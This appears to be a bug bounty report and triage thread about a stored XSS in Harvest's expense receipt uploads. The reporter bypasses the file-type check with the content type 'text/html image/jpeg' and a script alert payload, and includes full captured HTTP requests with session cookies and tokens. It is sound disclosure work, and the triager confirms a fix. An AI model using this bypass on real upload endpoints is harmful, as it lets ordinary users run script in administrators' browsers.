title: XSS on expenses attachments

profile.name: Harvest
profile.about: Harvest is a leader in online time tracking and invoicing. Work better, and make smarter decisions for your business.

vulnerability_information:
Summary
------
Hey there! 
After  #152591 was fixed, I decided to take another look at the attachments and found a new bypass to upload attachments which will be served with a user-controlled `Content-type`. 

The invoices attachments are not vulnerable, as they are all served with `Content-Disposition: attachment;`. 

However, the expense receipts are served inline if we provide a content-type which includes `image/jpeg`. Then we simply need to force the browser to not interpret it as an image, this can be done by supplying `text/html image/jpeg` as content-type. The image/jpeg will just be ignored (tested on firefox and chrome).

Steps to reproduce
------
1. Create a new expense and add a receipt.
2. Intercept the POST request and modify the `receipt` parameter to look like this:

    ```{bash}
Content-Disposition: form-data; name="receipt"; filename="blabla"
Content-Type: text/html image/jpeg

    <script>alert(document.domain);</script>
```
3. It will create the expense and return you a URL for viewing the receipt. Open the url and you should see the XSS

Impact
-------
Expenses can be created by regular users, therefore they could XSS their admins. However, I don't see a feature to publicly share an expense like the invoices in #152591, so I guess you can not use it to XSS cross-app.

**Note**: This bypass works also on the invoices attachments. But since they are served as attachments, no XSS is possible as far as I can tell.
vulnerability_information_html:
Summary

Hey there!
After #152591 was fixed, I decided to take another look at the attachments and found a new bypass to upload attachments which will be served with a user-controlled Content-type.

The invoices attachments are not vulnerable, as they are all served with Content-Disposition: attachment;.

However, the expense receipts are served inline if we provide a content-type which includes image/jpeg. Then we simply need to force the browser to not interpret it as an image, this can be done by supplying text/html image/jpeg as content-type. The image/jpeg will just be ignored (tested on firefox and chrome).

Steps to reproduce

  1. Create a new expense and add a receipt.

  2. Intercept the POST request and modify the receipt parameter to look like this:

    Content-Disposition: form-data; name="receipt"; filename="blabla"
Content-Type: text/html image/jpeg

<script>alert(document.domain);</script>

  3. It will create the expense and return you a URL for viewing the receipt. Open the url and you should see the XSS

Impact

Expenses can be created by regular users, therefore they could XSS their admins. However, I don't see a feature to publicly share an expense like the invoices in #152591, so I guess you can not use it to XSS cross-app.

Note: This bypass works also on the invoices attachments. But since they are served as attachments, no XSS is possible as far as I can tell.

activities.message:
Hi Edgar,

Thanks a lot for this one! I'm trying to reproduce it without luck. I get `Receipt has contents that are not what they are reported to be` every time I modify the content and content-type.

What are you using to intercept and modify the request on Chrome?

Cheers,
Jorge
activities.markdown_message:
Hi Edgar,

Thanks a lot for this one! I'm trying to reproduce it without luck. I get Receipt has contents that are not what they are reported to be every time I modify the content and content-type.

What are you using to intercept and modify the request on Chrome?

Cheers,
Jorge

activities.message:
Hey Jorge,

sorry about that. I use burp to intercept the requests. Here are the original and modified request (just changed the last POST parameter):

**original**
```http
POST /api/v2/expenses?user_id=1374213 HTTP/1.1
Host: asdfasdfgg.harvestapp.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-CSRF-Token: BbmcH/f+jBHHZuIziG4fxAfn+1lrILzJT2iZDWdJ+dDyiuMKEOar3J8/FZj2gtYM4xjaGAkN49XECYXTPv/yWw==
X-Requested-With: XMLHttpRequest
Referer: https://asdfasdfgg.harvestapp.com/expenses
Content-Length: 1507
Content-Type: multipart/form-data; boundary=---------------------------17838777311605021843483527673
Cookie: _harvest_%3D--6b9441bddb1011e85ab457ba94d448e32ff60d8b; platform_user_id=BAhpAwRzFA%3D%3D--30deb6c1217bad0fd56ca34fd64d86ef60cbec60; removed_from_remarketing=true; production_access_token=Uyt1NHk0emZDZ1p0ZHJyNGVTQjZCVnBmd0tmWGtEekxNOWM0UmVKcXJ5aTJEVWIyMWdZZGdVVHlNRnc3MlhGRFdyNlZUeCtSUWhDL2VxcnZpSHkwclVhN1c0NmtMNFcyTUdvc1lRSUFzdWpoY3czNjVlTHYvRHFramFHTVhBdzhEbk42WHVUT0M2bndhNDBUc1psSUx3PT0tLWZuRVRmWldYaEM2MXNuUzZlMXNFdmc9PQ%3D%3D--c1e5888f3ac0918014580f1c9f6a22acc15d0134
Connection: close

-----------------------------17838777311605021843483527673
Content-Disposition: form-data; name="billable"

1
-----------------------------17838777311605021843483527673
Content-Disposition: form-data; name="user_id"

1374213
-----------------------------17838777311605021843483527673
Content-Disposition: form-data; name="spent_at"

2016-09-02
-----------------------------17838777311605021843483527673

BbmcH/f+jBHHZuIziG4fxAfn+1lrILzJT2iZDWdJ+dDyiuMKEOar3J8/FZj2gtYM4xjaGAkN49XECYXTPv/yWw==
-----------------------------17838777311605021843483527673

-----------------------------17838777311605021843483527673

-----------------------------17838777311605021843483527673
Content-Disposition: form-data; name="total_cost"

11.00
-----------------------------17838777311605021843483527673
Content-Disposition: form-data; name="receipt"; filename="test.jpeg"
Content-Type: image/jpeg

JPEG

-----------------------------17838777311605021843483527673--
```

**modified**
```http
POST /api/v2/expenses?user_id=1374213 HTTP/1.1
Host: asdfasdfgg.harvestapp.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-CSRF-Token: BbmcH/f+jBHHZuIziG4fxAfn+1lrILzJT2iZDWdJ+dDyiuMKEOar3J8/FZj2gtYM4xjaGAkN49XECYXTPv/yWw==
X-Requested-With: XMLHttpRequest
Referer: https://asdfasdfgg.harvestapp.com/expenses
Content-Length: 1547
Content-Type: multipart/form-data; boundary=---------------------------17838777311605021843483527673
Cookie: _harvest_%3D--6b9441bddb1011e85ab457ba94d448e32ff60d8b; platform_user_id=BAhpAwRzFA%3D%3D--30deb6c1217bad0fd56ca34fd64d86ef60cbec60; removed_from_remarketing=true; production_access_token=Uyt1NHk0emZDZ1p0ZHJyNGVTQjZCVnBmd0tmWGtEekxNOWM0UmVKcXJ5aTJEVWIyMWdZZGdVVHlNRnc3MlhGRFdyNlZUeCtSUWhDL2VxcnZpSHkwclVhN1c0NmtMNFcyTUdvc1lRSUFzdWpoY3czNjVlTHYvRHFramFHTVhBdzhEbk42WHVUT0M2bndhNDBUc1psSUx3PT0tLWZuRVRmWldYaEM2MXNuUzZlMXNFdmc9PQ%3D%3D--c1e5888f3ac0918014580f1c9f6a22acc15d0134
Connection: close

-----------------------------17838777311605021843483527673
Content-Disposition: form-data; name="billable"

1
-----------------------------17838777311605021843483527673
Content-Disposition: form-data; name="user_id"

1374213
-----------------------------17838777311605021843483527673
Content-Disposition: form-data; name="spent_at"

2016-08-02
-----------------------------17838777311605021843483527673
Content-Disposition: form-data; name="authenticity_token"

BbmcH/f+jBHHZuIziG4fxAfn+1lrILzJT2iZDWdJ+dDyiuMKEOar3J8/FZj2gtYM4xjaGAkN49XECYXTPv/yWw==
-----------------------------17838777311605021843483527673
Content-Disposition: form-data; name="delete_receipt"


-----------------------------17838777311605021843483527673
Content-Disposition: form-data; name="project_id"

11576566
-----------------------------17838777311605021843483527673
Content-Disposition: form-data; name="expense_category_id"

3529908
-----------------------------17838777311605021843483527673
Content-Disposition: form-data; name="notes"


-----------------------------17838777311605021843483527673
Content-Disposition: form-data; name="units"


-----------------------------17838777311605021843483527673
Content-Disposition: form-data; name="total_cost"

11.00
-----------------------------17838777311605021843483527673
Content-Disposition: form-data; name="receipt"; filename="test"
Content-Type: text/html image/jpeg

<script>alert(document.domain);</script>
-----------------------------17838777311605021843483527673--
```

Then the response is:
```json
{"id":12126357,"user_id":1374213,"project_id":11576566,"expense_category_id":3529908,"invoice_id":0,"notes":"","total_cost":11.0,"units":1.0,"has_receipt":true,"receipt_url":"https://asdfasdfgg.harvestapp.com/expenses/12126357/receipt","receipt_file_name":"test","is_closed":false,"is_locked":false,"locked_reason":null,"spent_at":"2016-08-02","created_at":"2016-09-02T18:45:10Z","updated_at":"2016-09-02T18:45:10Z","billable":true,"project_full_name":"[AAAAAAAAAAA] asdf","client_currency":"GBP","client_id":4778185,"client_name":"asdf","expense_category_name":"Lodging","unit_price":null,"unit_name":null}
```

And when I open the receipt_url I get the response:

```http
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 02 Sep 2016 18:49:48 GMT
Content-Type: text/html image/jpeg
Content-Length: 40
Connection: close
Cache-Control: max-age=0
Content-Disposition: inline; filename="test."

<script>alert(document.domain);</script>
```
And you can see the XSS in the picture I have attached to this comment.

Hope this helps!

activities.message:
Thanks a lot for the clarification, I've been able to reproduce it!
I'm changing the state to triage and we will contact you as soon as it is fixed.

Cheers,
Jorge

I have checked back on this issue and it seems to be fixed now :)

Cheers,
Jorge
